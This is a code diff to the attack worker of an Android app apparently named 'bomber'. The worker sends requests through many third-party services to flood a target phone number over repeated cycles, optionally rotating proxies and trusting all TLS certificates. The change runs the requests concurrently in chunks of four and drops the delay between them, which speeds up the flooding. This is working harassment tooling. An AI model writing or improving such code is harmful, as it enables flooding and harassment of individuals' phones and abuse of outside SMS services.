@@ -61,10 +61,11 @@ public class AttackWorker extends Worker {
 
     private static final String CHANNEL_ID = "attack";
 
+    private static final int CHUNK_SIZE = 4;
+
     private int progress = 0;
 
     private CountDownLatch tasks;
-    private boolean stopped;
 
     @SuppressLint({"CustomX509TrustManager", "TrustAllX509TrustManager"})
     private final TrustManager[] trustAllCerts = new TrustManager[]{
@@ -159,10 +160,8 @@ public class AttackWorker extends Worker {
             notificationManager.createNotificationChannel(channel);
         }
 
-        attack:
         for (int cycle = 0; cycle < repeats; cycle++) {
             Log.i(TAG, "Started cycle " + cycle);
-            tasks = new CountDownLatch(usableServices.size());
 
             if (!proxies.isEmpty()) {
                 AuthableProxy authableProxy = proxies.get(cycle % proxies.size());
@@ -173,10 +172,24 @@ public class AttackWorker extends Worker {
                         .build();
             }
 
-            for (Service service : usableServices) {
+            for (int index = 0; index < usableServices.size(); index++) {
+                Service service = usableServices.get(index);
+
+                if (index % CHUNK_SIZE == 0) {
+                    if (tasks != null)
+                        try {
+                            tasks.await();
+                        } catch (InterruptedException e) {
+                            e.printStackTrace();
+                        }
+
+                    tasks = new CountDownLatch(
+                            Math.min(usableServices.size() - index, CHUNK_SIZE));
+                }
 
                 if (isStopped()) {
-                    break attack;
+                    cycle = repeats;
+                    break;
                 }
 
                 service.run(client, new com.dm.bomber.services.Callback() {
@@ -188,55 +201,48 @@ public class AttackWorker extends Worker {
 
                     @Override
                     public void onResponse(@NotNull Call call, @NotNull Response response) {
-                        if (!stopped) {
-                            Intent intent = new Intent(getApplicationContext(), MainActivity.class);
-                            intent.putExtra(MainActivity.TASK_ID, getId().toString());
+                        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
+                        intent.putExtra(MainActivity.TASK_ID, getId().toString());
 
-                            TaskStackBuilder stackBuilder = TaskStackBuilder.create(getApplicationContext());
-                            stackBuilder.addParentStack(MainActivity.class);
-                            stackBuilder.addNextIntent(intent);
+                        TaskStackBuilder stackBuilder = TaskStackBuilder.create(getApplicationContext());
+                        stackBuilder.addParentStack(MainActivity.class);
+                        stackBuilder.addNextIntent(intent);
 
-                            PendingIntent pendingIntent = stackBuilder.getPendingIntent(0,
-                                    android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT);
+                        PendingIntent pendingIntent = stackBuilder.getPendingIntent(0,
+                                android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT);
 
-                            Notification notification = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
-                                    .setContentTitle(getApplicationContext().getString(R.string.attack))
-                                    .setContentText("+" + countryCode + phone)
-                                    .setProgress(usableServices.size() * repeats, progress, false)
-                                    .setOngoing(true)
-                                    .setSmallIcon(R.drawable.logo)
-                                    .setPriority(NotificationCompat.PRIORITY_HIGH)
-                                    .addAction(R.drawable.logo, getApplicationContext().getString(R.string.stop), pendingIntent)
-                                    .build();
+                        Notification notification = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
+                                .setContentTitle(getApplicationContext().getString(R.string.attack))
+                                .setContentText("+" + countryCode + phone)
+                                .setProgress(usableServices.size() * repeats, progress, false)
+                                .setOngoing(true)
+                                .setSmallIcon(R.drawable.logo)
+                                .setPriority(NotificationCompat.PRIORITY_HIGH)
+                                .addAction(R.drawable.logo, getApplicationContext().getString(R.string.stop), pendingIntent)
+                                .build();
 
-                            notification.flags |= Notification.FLAG_ONGOING_EVENT;
+                        notification.flags |= Notification.FLAG_ONGOING_EVENT;
 
-                            notificationManager.notify(getId().hashCode(), notification);
+                        notificationManager.notify(getId().hashCode(), notification);
 
-                            setProgressAsync(new Data.Builder()
-                                    .putInt(KEY_PROGRESS, progress++)
-                                    .putInt(KEY_MAX_PROGRESS, usableServices.size() * repeats)
-                                    .build());
-                        }
+                        setProgressAsync(new Data.Builder()
+                                .putInt(KEY_PROGRESS, progress++)
+                                .putInt(KEY_MAX_PROGRESS, usableServices.size() * repeats)
+                                .build());
+
                         tasks.countDown();
                     }
                 }, new Phone(countryCode, phone));
-
-                try {
-                    Thread.sleep(500);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-
-            try {
-                tasks.await();
-            } catch (InterruptedException e) {
-                e.printStackTrace();
             }
         }
 
-        stopped = true;
+        try {
+            if (!isStopped())
+                tasks.await();
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
         notificationManager.cancel(getId().hashCode());
 
         Log.i(TAG, "Attack ended +" + countryCode + phone);
